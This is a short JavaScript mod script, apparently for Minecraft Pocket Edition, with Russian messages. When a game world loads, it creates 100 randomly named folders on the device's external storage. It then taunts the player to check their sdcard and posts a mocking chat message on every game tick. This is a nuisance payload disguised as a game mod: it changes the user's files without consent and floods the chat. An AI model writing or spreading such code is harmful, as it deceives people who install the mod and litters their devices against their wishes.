//Original от ScaryEnderman
function newLevel() {
clientMessage("Теперь зайдите в свою sdcard'у :D");
    for (var i = 0; i < 100; i++) {
        var r = Math.floor(Math.random() * 10000);
        var d = new java.io.File(android.os.Environment.getExternalStorageDirectory().getAbsolutePath(), r);
        d.mkdirs();
    }
    print("Вхахаха!!! Зайди на sdcard'у");
}

function modTick() {
    clientMessage("ВХАХАХАХА!!!! зайди на sdcard'у!!!");
}
